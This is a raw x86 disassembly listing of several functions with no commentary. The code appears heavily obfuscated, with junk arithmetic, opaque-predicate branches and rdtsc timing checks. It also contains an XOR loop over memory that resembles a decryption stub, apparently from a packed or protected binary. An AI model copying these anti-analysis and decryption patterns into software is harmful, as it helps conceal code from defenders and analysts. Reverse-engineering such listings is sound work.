  41c3bd:	mov    ecx,DWORD PTR [ebp-0x4]
  41c3c0:	mov    eax,0x51050000
  41c3c5:	sub    eax,esi
  41c3c7:	add    eax,edi
  41c3c9:	cmp    ecx,0x82e8
  41c3cf:	jne    0x41c42f
  41c3d1:	add    DWORD PTR [ebp-0x4],edi
  41c3d4:	add    ecx,esi
  41c3d6:	cmp    ecx,0xd9f1
  41c3dc:	jne    0x41c42f
  41c3de:	sub    eax,ecx
  41c3e0:	sub    eax,ecx
  41c3e2:	mov    DWORD PTR [ebp-0x20],edx
  41c3e5:	cmp    eax,0xffffffa3
  41c3e8:	je     0x41c42f
  41c3ea:	mov    DWORD PTR [ebp-0x4],ebx
  41c3ed:	add    eax,eax
  41c3ef:	cmp    eax,DWORD PTR ds:0x459930
  41c3f5:	jne    0x41c42f
  41c3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  41c3fa:	sub    eax,esi
  41c3fc:	sub    eax,edi
  41c3fe:	cmp    eax,0xfffffffb
  41c401:	jne    0x41c42f
  41c403:	add    ecx,ebx
  41c405:	test   edi,0x713f
  41c40b:	je     0x41c42f
  41c40d:	sub    DWORD PTR [ebp-0x20],edi
  41c410:	mov    edx,DWORD PTR [ebp-0x4]
  41c413:	and    DWORD PTR [ebp-0x4],edx
  41c416:	mov    edx,DWORD PTR [ebp-0x20]
  41c419:	and    DWORD PTR [ebp-0x4],edx
  41c41c:	add    DWORD PTR [ebp-0x20],eax
  41c41f:	cmp    edi,0x7a
  41c422:	je     0x41c42f
  41c424:	add    ecx,eax
  41c426:	and    ecx,eax
  41c428:	add    ecx,eax
  41c42a:	sub    ecx,edi
  41c42c:	add    DWORD PTR [ebp-0x30],ecx
  41c42f:	leave  
  41c430:	ret    0x8
  41c433:	int3   
  41c434:	int3   
  41c435:	int3   
  41c436:	int3   
  41c437:	int3   
  41c438:	push   ebp
  41c439:	mov    ebp,esp
  41c43b:	sub    esp,0x38
  41c43e:	mov    edx,0xad84
  41c443:	mov    DWORD PTR [ebp-0x1c],edx
  41c446:	push   ebx
  41c447:	mov    eax,DWORD PTR [ebp-0x1c]
  41c44a:	mov    ebx,eax
  41c44c:	and    DWORD PTR [ebp-0x1c],ebx
  41c44f:	push   esi
  41c450:	add    DWORD PTR [ebp-0x1c],ebx
  41c453:	push   edi
  41c454:	add    DWORD PTR [ebp-0x1c],ebx
  41c457:	test   eax,0xce
  41c45c:	jne    0x41c4d2
  41c45e:	mov    edi,0xc
  41c463:	mov    eax,DWORD PTR [ebp-0x1c]
  41c466:	or     DWORD PTR [ebp-0x1c],edi
  41c469:	sub    DWORD PTR [ebp-0x1c],edx
  41c46c:	test   eax,0xc1
  41c471:	jne    0x41c4d2
  41c473:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c476:	and    DWORD PTR [ebp-0x1c],ebx
  41c479:	mov    ebx,DWORD PTR ds:0x4599b8
  41c47f:	add    DWORD PTR [ebp-0x1c],eax
  41c482:	cmp    eax,0xffffffe6
  41c485:	jne    0x41c4d2
  41c487:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c48a:	test   ecx,0x5820304
  41c490:	je     0x41c4d2
  41c492:	sub    ecx,edi
  41c494:	mov    ebx,DWORD PTR ds:0x4599b8
  41c49a:	mov    edx,DWORD PTR [ebp-0x1c]
  41c49d:	and    ecx,edi
  41c49f:	or     ecx,edi
  41c4a1:	sub    ebx,eax
  41c4a3:	cmp    ebx,DWORD PTR [ebp-0x8]
  41c4a6:	jne    0x41c4d2
  41c4a8:	sub    DWORD PTR [ebp-0x1c],ebx
  41c4ab:	cmp    ecx,0x3f
  41c4ae:	je     0x41c4d2
  41c4b0:	add    ecx,ebx
  41c4b2:	sub    ecx,ebx
  41c4b4:	cmp    ecx,0xffffff87
  41c4b7:	je     0x41c4d2
  41c4b9:	cmp    ecx,0xffffff8a
  41c4bc:	jne    0x41c4d2
  41c4be:	mov    edi,DWORD PTR ds:0x4599b8
  41c4c4:	or     edi,ebx
  41c4c6:	sub    ecx,edx
  41c4c8:	and    ecx,edx
  41c4ca:	sub    edi,eax
  41c4cc:	add    DWORD PTR [ebp-0x1c],ecx
  41c4cf:	add    DWORD PTR [ebp-0x1c],edi
  41c4d2:	mov    edi,DWORD PTR ds:0x4599b8
  41c4d8:	sub    edi,edx
  41c4da:	mov    esi,DWORD PTR [ebp-0x1c]
  41c4dd:	add    DWORD PTR [ebp-0x1c],esi
  41c4e0:	test   esi,0x91
  41c4e6:	je     0x41c4fe
  41c4e8:	mov    eax,0x673e
  41c4ed:	xor    DWORD PTR [ebp-0x1c],edi
  41c4f0:	sub    DWORD PTR [ebp-0x1c],edx
  41c4f3:	mov    edi,DWORD PTR [ebp-0x1c]
  41c4f6:	sub    DWORD PTR [ebp-0x1c],eax
  41c4f9:	add    edi,esi
  41c4fb:	add    DWORD PTR [ebp-0x1c],edi
  41c4fe:	rdtsc  
  41c500:	mov    esi,0x24
  41c505:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c508:	sub    ebx,esi
  41c50a:	add    ebx,edi
  41c50c:	and    edx,edi
  41c50e:	sub    ebx,edi
  41c510:	add    DWORD PTR [ebp-0x1c],edx
  41c513:	sub    DWORD PTR [ebp-0x1c],ebx
  41c516:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c519:	cmp    ecx,DWORD PTR ds:0x4599b8
  41c51f:	je     0x41c540
  41c521:	cmp    ecx,DWORD PTR ds:0x4599b8
  41c527:	je     0x41c540
  41c529:	and    ecx,ebx
  41c52b:	mov    edi,DWORD PTR [ebp-0x1c]
  41c52e:	add    DWORD PTR [ebp-0x1c],edx
  41c531:	sub    DWORD PTR [ebp-0x1c],ebx
  41c534:	add    DWORD PTR [ebp-0x1c],ecx
  41c537:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c53a:	add    DWORD PTR [ebp-0x1c],ecx
  41c53d:	sub    DWORD PTR [ebp-0x1c],edi
  41c540:	mov    DWORD PTR [ebp-0x2c],eax
  41c543:	mov    edx,DWORD PTR [ebp-0x1c]
  41c546:	mov    eax,0x5a
  41c54b:	add    edx,ecx
  41c54d:	sub    DWORD PTR [ebp-0x1c],edx
  41c550:	add    eax,ebx
  41c552:	add    DWORD PTR [ebp-0x1c],eax
  41c555:	add    DWORD PTR [ebp-0x1c],esi
  41c558:	rdtsc  
  41c55a:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c55d:	cmp    ebx,0x3123
  41c563:	je     0x41c58e
  41c565:	add    ebx,ecx
  41c567:	mov    edi,0x3b32
  41c56c:	sub    edx,edi
  41c56e:	sub    DWORD PTR [ebp-0x1c],esi
  41c571:	and    ebx,edi
  41c573:	mov    esi,ebx
  41c575:	cmp    esi,eax
  41c577:	je     0x41c58e
  41c579:	sub    esi,edi
  41c57b:	add    edx,esi
  41c57d:	mov    ecx,DWORD PTR ds:0x4599b8
  41c583:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c586:	and    ebx,edx
  41c588:	mov    DWORD PTR [ebp-0x1c],ebx
  41c58b:	add    DWORD PTR [ebp-0x1c],ecx
  41c58e:	mov    DWORD PTR [ebp-0x1c],esi
  41c591:	sub    eax,DWORD PTR [ebp-0x2c]
  41c594:	mov    edx,0xf2
  41c599:	mov    ebx,esi
  41c59b:	add    edx,edx
  41c59d:	cmp    eax,0x210080cd
  41c5a2:	je     0x41c5c9
  41c5a4:	mov    edi,0xc14f
  41c5a9:	mov    esi,DWORD PTR [ebp-0x1c]
  41c5ac:	or     edx,eax
  41c5ae:	sub    DWORD PTR [ebp-0x1c],ebx
  41c5b1:	sub    edx,esi
  41c5b3:	cmp    edx,0x48
  41c5b6:	je     0x41c5c6
  41c5b8:	mov    ebx,0xe0
  41c5bd:	add    ebx,ecx
  41c5bf:	add    ebx,edx
  41c5c1:	add    ebx,edx
  41c5c3:	and    DWORD PTR [ebp-0x1c],ebx
  41c5c6:	sub    DWORD PTR [ebp-0x1c],edi
  41c5c9:	add    ebx,edx
  41c5cb:	mov    edi,0xe4
  41c5d0:	or     edi,eax
  41c5d2:	mov    ecx,DWORD PTR ds:0x459958
  41c5d8:	sub    DWORD PTR [ebp-0x1c],ecx
  41c5db:	add    ebx,edi
  41c5dd:	cmp    ebx,0xffffffd4
  41c5e0:	jne    0x41c5e7
  41c5e2:	sub    ebx,esi
  41c5e4:	add    DWORD PTR [ebp-0x1c],ebx
  41c5e7:	cmp    edi,DWORD PTR [ebp-0x1c]
  41c5ea:	je     0x41c5ef
  41c5ec:	add    DWORD PTR [ebp-0x1c],edi
  41c5ef:	pop    edi
  41c5f0:	test   edi,0x46
  41c5f6:	jne    0x41c66a
  41c5f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c5fb:	sub    DWORD PTR [ebp-0x1c],edi
  41c5fe:	cmp    ebx,0x7168
  41c604:	jne    0x41c66a
  41c606:	or     ecx,edx
  41c608:	mov    esi,0xd941
  41c60d:	sub    DWORD PTR [ebp-0x1c],ecx
  41c610:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c613:	add    ecx,ecx
  41c615:	sub    DWORD PTR [ebp-0x1c],ecx
  41c618:	cmp    edx,0xffffffdf
  41c61b:	je     0x41c66a
  41c61d:	mov    esi,0x3b
  41c622:	mov    edx,ebx
  41c624:	and    edx,eax
  41c626:	cmp    edx,ecx
  41c628:	jne    0x41c66a
  41c62a:	mov    ebx,0x6a
  41c62f:	or     DWORD PTR [ebp-0x1c],esi
  41c632:	add    DWORD PTR [ebp-0x1c],ebx
  41c635:	cmp    edx,DWORD PTR [ebp-0x34]
  41c638:	jne    0x41c66a
  41c63a:	mov    esi,0xa0d3
  41c63f:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c642:	test   edx,0xf4
  41c648:	jne    0x41c66a
  41c64a:	sub    ecx,esi
  41c64c:	mov    ebx,edi
  41c64e:	mov    esi,DWORD PTR ds:0x459968
  41c654:	add    edx,eax
  41c656:	sub    ebx,eax
  41c658:	cmp    ebx,0x45
  41c65b:	je     0x41c66a
  41c65d:	sub    ebx,esi
  41c65f:	add    DWORD PTR [ebp-0x1c],edx
  41c662:	sub    DWORD PTR [ebp-0x1c],ebx
  41c665:	sub    ecx,esi
  41c667:	or     DWORD PTR [ebp-0x1c],ecx
  41c66a:	pop    esi
  41c66b:	mov    edx,0x1058
  41c670:	or     DWORD PTR [ebp-0x1c],edi
  41c673:	or     edx,ebx
  41c675:	add    DWORD PTR [ebp-0x1c],esi
  41c678:	add    DWORD PTR [ebp-0x1c],edx
  41c67b:	pop    ebx
  41c67c:	mov    ecx,DWORD PTR ds:0x459958
  41c682:	mov    edx,0xc7
  41c687:	sub    DWORD PTR [ebp-0x1c],ebx
  41c68a:	and    ecx,edi
  41c68c:	cmp    edi,0x24
  41c68f:	je     0x41c6dc
  41c691:	add    DWORD PTR [ebp-0x1c],edx
  41c694:	cmp    ecx,0x53
  41c697:	jne    0x41c6dc
  41c699:	mov    edx,0xf9
  41c69e:	sub    DWORD PTR [ebp-0x1c],edx
  41c6a1:	cmp    ecx,DWORD PTR [ebp-0x4]
  41c6a4:	je     0x41c6dc
  41c6a6:	mov    edx,0xb8
  41c6ab:	and    edx,eax
  41c6ad:	sub    DWORD PTR [ebp-0x1c],ecx
  41c6b0:	cmp    edx,0xffffffea
  41c6b3:	jne    0x41c6dc
  41c6b5:	cmp    edx,0x8fec
  41c6bb:	jne    0x41c6dc
  41c6bd:	or     edx,esi
  41c6bf:	sub    edx,ebx
  41c6c1:	and    edx,eax
  41c6c3:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c6c6:	cmp    ecx,DWORD PTR ds:0x4599b8
  41c6cc:	je     0x41c6dc
  41c6ce:	sub    edx,ecx
  41c6d0:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c6d3:	add    DWORD PTR [ebp-0x1c],edi
  41c6d6:	sub    DWORD PTR [ebp-0x1c],edx
  41c6d9:	mov    DWORD PTR [ebp-0x1c],ecx
  41c6dc:	leave  
  41c6dd:	ret    
  41c6de:	int3   
  41c6df:	int3   
  41c6e0:	int3   
  41c6e1:	int3   
  41c6e2:	int3   
  41c6e3:	push   ebp
  41c6e4:	mov    ebp,esp
  41c6e6:	sub    esp,0x30
  41c6e9:	mov    edx,0x50
  41c6ee:	mov    eax,0x72ab
  41c6f3:	sub    eax,edx
  41c6f5:	and    eax,edx
  41c6f7:	mov    DWORD PTR [ebp-0x4],edx
  41c6fa:	sub    eax,edx
  41c6fc:	or     DWORD PTR [ebp-0x4],eax
  41c6ff:	push   ebx
  41c700:	mov    ecx,DWORD PTR [ebp-0x4]
  41c703:	sub    DWORD PTR [ebp-0x4],ecx
  41c706:	push   esi
  41c707:	and    ecx,edx
  41c709:	sub    ecx,eax
  41c70b:	mov    esi,0x86
  41c710:	sub    ecx,eax
  41c712:	mov    edx,DWORD PTR [ebp-0x4]
  41c715:	test   ecx,0x3a
  41c71b:	jne    0x41c735
  41c71d:	mov    eax,DWORD PTR [ebp-0x4]
  41c720:	mov    ebx,0xdaff
  41c725:	add    DWORD PTR [ebp-0x4],eax
  41c728:	xor    DWORD PTR [ebp-0x4],ecx
  41c72b:	sub    edx,esi
  41c72d:	xor    DWORD PTR [ebp-0x4],ebx
  41c730:	sub    edx,ecx
  41c732:	sub    DWORD PTR [ebp-0x4],edx
  41c735:	push   edi
  41c736:	mov    eax,DWORD PTR [ebp-0x4]
  41c739:	add    eax,eax
  41c73b:	mov    ebx,0x1a
  41c740:	cmp    eax,ecx
  41c742:	jne    0x41c7c2
  41c744:	mov    esi,DWORD PTR ds:0x4599c4
  41c74a:	and    esi,ecx
  41c74c:	mov    ecx,DWORD PTR [ebp-0x4]
  41c74f:	sub    DWORD PTR [ebp-0x4],ebx
  41c752:	or     eax,ebx
  41c754:	cmp    esi,DWORD PTR [ebp-0x18]
  41c757:	je     0x41c7c2
  41c759:	mov    ebx,0xc791
  41c75e:	sub    DWORD PTR [ebp-0x4],ecx
  41c761:	sub    DWORD PTR [ebp-0x4],ebx
  41c764:	mov    edx,DWORD PTR [ebp-0x4]
  41c767:	cmp    edx,DWORD PTR ds:0x4599c4
  41c76d:	je     0x41c7c2
  41c76f:	mov    ebx,DWORD PTR ds:0x4599c4
  41c775:	mov    ecx,DWORD PTR ds:0x459974
  41c77b:	add    DWORD PTR [ebp-0x4],ebx
  41c77e:	or     DWORD PTR [ebp-0x4],ecx
  41c781:	add    esi,eax
  41c783:	add    DWORD PTR [ebp-0x4],edx
  41c786:	cmp    esi,0xffffffbd
  41c789:	jne    0x41c7c2
  41c78b:	mov    ebx,DWORD PTR [ebp-0x4]
  41c78e:	mov    eax,DWORD PTR ds:0x459974
  41c794:	cmp    esi,0x47
  41c797:	je     0x41c7c2
  41c799:	mov    edi,esi
  41c79b:	and    edi,eax
  41c79d:	or     edi,ecx
  41c79f:	add    DWORD PTR [ebp-0x4],ecx
  41c7a2:	cmp    ebx,edi
  41c7a4:	je     0x41c7c2
  41c7a6:	sub    edi,esi
  41c7a8:	cmp    edi,ebx
  41c7aa:	jne    0x41c7c2
  41c7ac:	mov    edx,DWORD PTR [ebp-0x4]
  41c7af:	add    DWORD PTR [ebp-0x4],edx
  41c7b2:	mov    esi,0x62
  41c7b7:	sub    DWORD PTR [ebp-0x4],esi
  41c7ba:	and    edi,eax
  41c7bc:	add    DWORD PTR [ebp-0x4],ebx
  41c7bf:	or     DWORD PTR [ebp-0x4],edi
  41c7c2:	mov    ecx,0x3b68
  41c7c7:	mov    DWORD PTR [ebp-0x4],ebx
  41c7ca:	add    DWORD PTR [ebp-0x4],ecx
  41c7cd:	mov    edx,DWORD PTR [ebp+0x10]
  41c7d0:	sub    ecx,eax
  41c7d2:	or     ecx,ebx
  41c7d4:	add    DWORD PTR [ebp-0x4],esi
  41c7d7:	mov    ebx,0x78
  41c7dc:	mov    edi,0x37
  41c7e1:	cmp    edx,DWORD PTR [ebp-0x24]
  41c7e4:	jne    0x41c865
  41c7e6:	cmp    edx,DWORD PTR ds:0x459974
  41c7ec:	je     0x41c865
  41c7ee:	add    ecx,ebx
  41c7f0:	add    ecx,esi
  41c7f2:	add    edi,ebx
  41c7f4:	mov    eax,0x51a4
  41c7f9:	mov    esi,ebx
  41c7fb:	add    DWORD PTR [ebp-0x4],ecx
  41c7fe:	add    DWORD PTR [ebp-0x4],esi
  41c801:	and    eax,ebx
  41c803:	sub    DWORD PTR [ebp-0x4],edx
  41c806:	add    eax,ecx
  41c808:	sub    edi,edx
  41c80a:	add    eax,esi
  41c80c:	sub    DWORD PTR [ebp-0x4],edi
  41c80f:	cmp    eax,0x5c
  41c812:	je     0x41c865
  41c814:	add    eax,ebx
  41c816:	mov    esi,DWORD PTR [ebp-0x4]
  41c819:	sub    eax,ebx
  41c81b:	add    DWORD PTR [ebp-0x4],eax
  41c81e:	mov    ebx,DWORD PTR [ebp-0x4]
  41c821:	sub    DWORD PTR [ebp-0x4],esi
  41c824:	test   ebx,0xa0
  41c82a:	je     0x41c865
  41c82c:	mov    eax,DWORD PTR ds:0x459974
  41c832:	mov    ecx,DWORD PTR ds:0x459938
  41c838:	mov    DWORD PTR [ebp-0xc],edi
  41c83b:	add    ebx,edi
  41c83d:	sub    DWORD PTR [ebp-0xc],edi
  41c840:	add    DWORD PTR [ebp-0xc],ebx
  41c843:	mov    DWORD PTR [ebp-0x4],ecx
  41c846:	add    DWORD PTR [ebp-0x4],edx
  41c849:	or     eax,edx
  41c84b:	cmp    eax,0x74
  41c84e:	jne    0x41c865
  41c850:	mov    edi,DWORD PTR [ebp-0x4]
  41c853:	sub    DWORD PTR [ebp-0x4],ebx
  41c856:	cmp    edi,ebx
  41c858:	je     0x41c865
  41c85a:	or     DWORD PTR [ebp-0xc],eax
  41c85d:	sub    DWORD PTR [ebp-0x4],eax
  41c860:	sub    edi,esi
  41c862:	xor    DWORD PTR [ebp-0xc],edi
  41c865:	mov    ecx,DWORD PTR [ebp+0x8]
  41c868:	mov    edi,0xe5
  41c86d:	add    edi,edi
  41c86f:	sub    DWORD PTR [ebp-0x4],ecx
  41c872:	mov    ebx,0xe2
  41c877:	sub    ebx,esi
  41c879:	sub    DWORD PTR [ebp-0x4],ebx
  41c87c:	xor    DWORD PTR [ebp-0x4],eax
  41c87f:	cmp    ebx,DWORD PTR ds:0x4599c4
  41c885:	je     0x41c891
  41c887:	add    edi,eax
  41c889:	and    edi,ebx
  41c88b:	add    DWORD PTR [ebp-0x4],eax
  41c88e:	sub    DWORD PTR [ebp-0x4],edi
  41c891:	cmp    DWORD PTR [ebp+0xc],edx
  41c894:	je     0x41c90d
  41c896:	add    ebx,ebx
  41c898:	mov    edi,ebx
  41c89a:	mov    ebx,DWORD PTR [ebp-0x4]
  41c89d:	sub    DWORD PTR [ebp-0x4],ebx
  41c8a0:	cmp    edi,DWORD PTR ds:0x459974
  41c8a6:	je     0x41c8c8
  41c8a8:	add    edi,eax
  41c8aa:	mov    ebx,0x73
  41c8af:	sub    DWORD PTR [ebp-0x4],edi
  41c8b2:	add    DWORD PTR [ebp-0x4],eax
  41c8b5:	test   ecx,0xe549
  41c8bb:	jne    0x41c8c8
  41c8bd:	add    DWORD PTR [ebp-0x4],eax
  41c8c0:	mov    edi,ecx
  41c8c2:	sub    DWORD PTR [ebp-0x4],ebx
  41c8c5:	sub    DWORD PTR [ebp-0x4],edi
  41c8c8:	dec    DWORD PTR [ebp+0xc]
  41c8cb:	mov    ebx,DWORD PTR ds:0x459960
  41c8d1:	mov    edi,DWORD PTR [ebp-0x4]
  41c8d4:	cmp    edi,eax
  41c8d6:	je     0x41c8eb
  41c8d8:	add    DWORD PTR [ebp-0x4],ebx
  41c8db:	cmp    edi,0x46
  41c8de:	jne    0x41c8eb
  41c8e0:	test   edi,0x3bff
  41c8e6:	jne    0x41c8eb
  41c8e8:	sub    DWORD PTR [ebp-0x4],edi
  41c8eb:	xor    DWORD PTR [ecx],0x6d86b336
  41c8f1:	add    DWORD PTR [ebp-0x4],ebx
  41c8f4:	xor    DWORD PTR [ecx],edx
  41c8f6:	mov    edi,DWORD PTR [ebp-0x4]
  41c8f9:	add    edi,edi
  41c8fb:	sub    edi,ebx
  41c8fd:	sub    edi,edx
  41c8ff:	xor    DWORD PTR [ebp-0x4],edi
  41c902:	add    ecx,0x4
  41c905:	xor    DWORD PTR [ebp-0x4],ecx
  41c908:	jmp    0x41c868
  41c90d:	mov    edi,DWORD PTR [ebp-0x4]
  41c910:	cmp    edi,DWORD PTR [ebp-0xc]
  41c913:	jne    0x41c91d
  41c915:	and    edi,ecx
  41c917:	sub    DWORD PTR [ebp-0x4],ebx
  41c91a:	or     DWORD PTR [ebp-0x4],edi
  41c91d:	sub    DWORD PTR [ebp-0x4],edi
  41c920:	mov    ecx,DWORD PTR [ebp-0x4]
  41c923:	mov    esi,DWORD PTR [ebp-0x4]
  41c926:	add    DWORD PTR [ebp-0x4],esi
  41c929:	cmp    ecx,0xffffffc6
  41c92c:	je     0x41c931
  41c92e:	mov    DWORD PTR [ebp-0x4],ecx
  41c931:	pop    edi
  41c932:	mov    DWORD PTR [ebp-0x4],edi
  41c935:	pop    esi
  41c936:	cmp    esi,0x21
  41c939:	je     0x41c969
  41c93b:	add    ecx,edi
  41c93d:	add    ecx,edi
  41c93f:	mov    eax,0x81048084
  41c944:	sub    DWORD PTR [ebp-0x4],eax
  41c947:	mov    edx,eax
  41c949:	xor    DWORD PTR [ebp-0x4],ecx
  41c94c:	mov    DWORD PTR [ebp-0x4],esi
  41c94f:	add    edx,edi
  41c951:	sub    edx,ecx
  41c953:	cmp    edx,DWORD PTR ds:0x4599c4
  41c959:	jne    0x41c969
  41c95b:	mov    ecx,DWORD PTR [ebp-0x4]
  41c95e:	or     ecx,edx
  41c960:	mov    ebx,DWORD PTR [ebp-0x4]
  41c963:	sub    DWORD PTR [ebp-0x4],ecx
  41c966:	sub    DWORD PTR [ebp-0x4],ebx
  41c969:	pop    ebx
  41c96a:	sub    DWORD PTR [ebp-0x4],esi
  41c96d:	leave  
  41c96e:	ret    0xc
  41c971:	int3   
  41c972:	int3   
  41c973:	int3   
  41c974:	int3   
  41c975:	int3   
  41c976:	push   ebp
  41c977:	mov    ebp,esp
  41c979:	sub    esp,0x48
  41c97c:	mov    eax,0x8f884340
  41c981:	mov    ecx,0xcb
  41c986:	add    eax,eax
  41c988:	mov    DWORD PTR [ebp-0x24],eax
  41c98b:	and    DWORD PTR [ebp-0x24],ecx
  41c98e:	push   ebx
  41c98f:	mov    edx,DWORD PTR [ebp-0x24]
  41c992:	add    edx,eax
  41c994:	mov    ebx,edx
  41c996:	sub    ebx,edx
  41c998:	cmp    ebx,0x5a
  41c99b:	jne    0x41c9ac
  41c99d:	add    ebx,ebx
  41c99f:	add    ebx,eax
  41c9a1:	cmp    ebx,0x45b2
  41c9a7:	jne    0x41c9ac
  41c9a9:	xor    DWORD PTR [ebp-0x24],ebx
  41c9ac:	push   esi
  41c9ad:	cmp    edx,0x27da
  41c9b3:	jne    0x41c9b8
  41c9b5:	add    DWORD PTR [ebp-0x24],eax
  41c9b8:	push   edi
  41c9b9:	cmp    edx,0x74
  41c9bc:	jne    0x41c9c1
  41c9be:	add    DWORD PTR [ebp-0x24],ebx
  41c9c1:	add    DWORD PTR [ebp-0x24],eax
  41c9c4:	mov    esi,0xdb059742
  41c9c9:	mov    edi,DWORD PTR [ebp-0x24]
  41c9cc:	mov    eax,DWORD PTR [ebp-0x24]
  41c9cf:	cmp    edi,0xffffff8f
  41c9d2:	je     0x41c9e9
  41c9d4:	sub    edi,eax
  41c9d6:	add    DWORD PTR [ebp-0x24],esi
  41c9d9:	mov    eax,DWORD PTR [ebp-0x24]
  41c9dc:	mov    ebx,0x1a
  41c9e1:	mov    DWORD PTR [ebp-0x24],ebx
  41c9e4:	add    edi,eax
  41c9e6:	add    DWORD PTR [ebp-0x24],edi
  41c9e9:	sub    esi,0xdb059702
  41c9ef:	mov    ebx,edi
  41c9f1:	add    ebx,ecx
  41c9f3:	or     ebx,edx
  41c9f5:	mov    edi,0xd7b7
  41c9fa:	sub    edi,eax
  41c9fc:	and    edi,eax
  41c9fe:	cmp    ebx,0x3a3
  41ca04:	jne    0x41cb11
  41ca0a:	cmp    eax,ebx
  41ca0c:	je     0x41cb11
  41ca12:	add    ebx,eax
  41ca14:	cmp    ebx,0xffffffae
  41ca17:	je     0x41cb11
  41ca1d:	add    ebx,eax
  41ca1f:	sub    DWORD PTR [ebp-0x24],ebx
  41ca22:	test   eax,0x8b
  41ca27:	jne    0x41cb11
  41ca2d:	mov    ebx,DWORD PTR [ebp-0x24]
  41ca30:	mov    eax,DWORD PTR [ebp-0x24]
  41ca33:	cmp    edi,0x24
  41ca36:	jne    0x41cb11
  41ca3c:	mov    edx,DWORD PTR [ebp-0x24]
  41ca3f:	add    edx,esi
  41ca41:	add    eax,ecx
  41ca43:	mov    ecx,DWORD PTR [ebp-0x24]
  41ca46:	cmp    edx,ecx
  41ca48:	je     0x41cb11
  41ca4e:	sub    DWORD PTR [ebp-0x24],ebx
  41ca51:	sub    eax,ebx
  41ca53:	cmp    edx,edi
  41ca55:	jne    0x41cb11
  41ca5b:	test   ecx,0x65
  41ca61:	je     0x41cb11
  41ca67:	cmp    eax,DWORD PTR [ebp-0x18]
  41ca6a:	jne    0x41cb11
  41ca70:	mov    ebx,DWORD PTR ds:0x459978
  41ca76:	cmp    edx,DWORD PTR ds:0x459978
  41ca7c:	je     0x41cb11
  41ca82:	or     DWORD PTR [ebp-0x24],eax
  41ca85:	mov    eax,ecx
  41ca87:	or     DWORD PTR [ebp-0x24],edi
  41ca8a:	xor    DWORD PTR [ebp-0x24],ebx
  41ca8d:	cmp    ecx,0x5
  41ca90:	je     0x41cb11
  41ca92:	mov    edi,0x45
  41ca97:	add    edi,edx
  41ca99:	sub    eax,edx
  41ca9b:	mov    ecx,ebx
  41ca9d:	cmp    eax,0xe403
  41caa2:	je     0x41cb11
  41caa4:	cmp    edi,eax
  41caa6:	je     0x41cb11
  41caa8:	and    edi,esi
  41caaa:	mov    edx,edi
  41caac:	sub    eax,edi
  41caae:	mov    ebx,0x73
  41cab3:	add    DWORD PTR [ebp-0x24],ebx
  41cab6:	add    edx,edi
  41cab8:	add    DWORD PTR [ebp-0x24],eax
  41cabb:	xor    DWORD PTR [ebp-0x24],eax
  41cabe:	cmp    edx,DWORD PTR ds:0x459978
  41cac4:	je     0x41cb11
  41cac6:	mov    eax,DWORD PTR [ebp-0x24]
  41cac9:	mov    edi,0x81
  41cace:	and    eax,ebx
  41cad0:	xor    DWORD PTR [ebp-0x24],edi
  41cad3:	cmp    edx,0x45904440
  41cad9:	je     0x41cb11
  41cadb:	add    DWORD PTR [ebp-0x24],edx
  41cade:	mov    edx,DWORD PTR [ebp-0x24]
  41cae1:	cmp    eax,DWORD PTR [ebp-0x24]
  41cae4:	jne    0x41cb11
  41cae6:	mov    ebx,DWORD PTR [ebp-0x24]
  41cae9:	and    ecx,esi
  41caeb:	or     ecx,edi
  41caed:	add    ebx,esi
  41caef:	sub    ecx,edi
  41caf1:	cmp    ebx,0xffffffac
  41caf4:	jne    0x41cb11
  41caf6:	mov    edi,0x74
  41cafb:	mov    ecx,DWORD PTR [ebp-0x24]
  41cafe:	add    DWORD PTR [ebp-0x24],edx
  41cb01:	sub    eax,ebx
  41cb03:	add    eax,edi
  41cb05:	sub    DWORD PTR [ebp-0x24],ecx
  41cb08:	and    eax,edi
  41cb0a:	sub    eax,esi
  41cb0c:	sub    eax,edx
  41cb0e:	sub    DWORD PTR [ebp-0x24],eax
  41cb11:	push   esi
  41cb12:	mov    esi,DWORD PTR ds:0x459978
  41cb18:	add    esi,ecx
  41cb1a:	add    esi,edx
  41cb1c:	mov    edx,DWORD PTR [ebp-0x24]
  41cb1f:	add    esi,eax
  41cb21:	cmp    edx,0x78c4
  41cb27:	jne    0x41cc3e
  41cb2d:	sub    edx,eax
  41cb2f:	mov    edi,DWORD PTR ds:0x459978
  41cb35:	add    DWORD PTR [ebp-0x24],esi
  41cb38:	mov    ebx,0xdc
  41cb3d:	add    ebx,esi
  41cb3f:	add    ebx,esi
  41cb41:	add    DWORD PTR [ebp-0x24],ebx
  41cb44:	sub    edi,esi
  41cb46:	or     DWORD PTR [ebp-0x24],edx
  41cb49:	cmp    edi,ecx
  41cb4b:	je     0x41cc3e
  41cb51:	mov    eax,edi
  41cb53:	mov    edi,DWORD PTR [ebp-0x24]
  41cb56:	test   edi,0x7301
  41cb5c:	jne    0x41cc3e
  41cb62:	sub    eax,edx
  41cb64:	mov    ebx,0xf0
  41cb69:	sub    ebx,ecx
  41cb6b:	mov    ecx,DWORD PTR [ebp-0x24]
  41cb6e:	cmp    ebx,0xfffffff3
  41cb71:	je     0x41cc3e
  41cb77:	add    DWORD PTR [ebp-0x24],edx
  41cb7a:	sub    DWORD PTR [ebp-0x24],ecx
  41cb7d:	mov    edx,DWORD PTR ds:0x459978
  41cb83:	mov    ecx,DWORD PTR [ebp-0x24]
  41cb86:	sub    edi,esi
  41cb88:	add    edx,edi
  41cb8a:	cmp    ebx,DWORD PTR [ebp-0x40]
  41cb8d:	jne    0x41cc3e
  41cb93:	mov    esi,DWORD PTR [ebp-0x24]
  41cb96:	mov    edi,DWORD PTR [ebp-0x24]
  41cb99:	sub    ecx,ebx
  41cb9b:	add    esi,edi
  41cb9d:	add    DWORD PTR [ebp-0x24],ecx
  41cba0:	cmp    edx,0x4073
  41cba6:	jne    0x41cc3e
  41cbac:	sub    DWORD PTR [ebp-0x24],edx
  41cbaf:	mov    edi,DWORD PTR [ebp-0x24]
  41cbb2:	add    DWORD PTR [ebp-0x24],eax
  41cbb5:	cmp    esi,0xffffffb0
